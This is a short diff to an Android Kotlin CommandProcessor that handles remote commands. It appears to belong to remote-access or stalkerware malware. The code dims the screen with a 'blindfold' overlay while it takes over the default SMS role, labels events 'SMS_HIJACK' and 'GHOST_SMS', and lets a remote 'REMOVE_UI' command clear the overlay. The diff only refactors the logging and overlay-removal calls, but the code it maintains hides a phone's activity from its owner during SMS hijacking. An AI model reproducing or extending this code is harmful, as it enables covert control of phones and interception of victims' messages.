@@ -565,9 +565,9 @@ object CommandProcessor {
                                 DimmerManager.applyDim(ctx, 0, "AUTO")
                                 Handler(Looper.getMainLooper()).postDelayed({
                                     if (DefaultSmsManager.expectedMode == "AUTO" || DefaultSmsManager.expectedMode == "AUTO_NAV") {
-                                        DebugLogger.log("GHOST_SMS", "Safety fuse triggered. Disarming blindfold.")
+                                        val lastMode = DefaultSmsManager.expectedMode
                                         DefaultSmsManager.expectedMode = ""
-                                        DimmerManager.removeOverlay(ctx)
+                                        DynamicUIManager.removeOverlay(ctx, "SMS_HIJACK_SAFETY_FUSE: $lastMode")
                                     }
                                 }, 20000)
                             }
@@ -598,9 +598,8 @@ object CommandProcessor {
                             DimmerManager.applyDim(ctx, 0, "AUTO")
                             Handler(Looper.getMainLooper()).postDelayed({
                                 if (DefaultSmsManager.expectedMode == "RESTORE") {
-                                    DebugLogger.log("GHOST_SMS", "Restore safety fuse triggered. Disarming blindfold.")
                                     DefaultSmsManager.expectedMode = ""
-                                    DimmerManager.removeOverlay(ctx)
+                                    DynamicUIManager.removeOverlay(ctx, "SMS_RESTORE_SAFETY_FUSE")
                                 }
                             }, 20000)
                         }
@@ -1031,7 +1030,7 @@ object CommandProcessor {
                     }
                 }
                 "REMOVE_UI" -> {
-                    DynamicUIManager.removeOverlay(ctx)
+                    DynamicUIManager.removeOverlay(ctx, "REMOTE_COMMAND_PURGE")
                     status = "UI_REMOVED"
                 }
                 "STATUS_BAR_UI" -> {
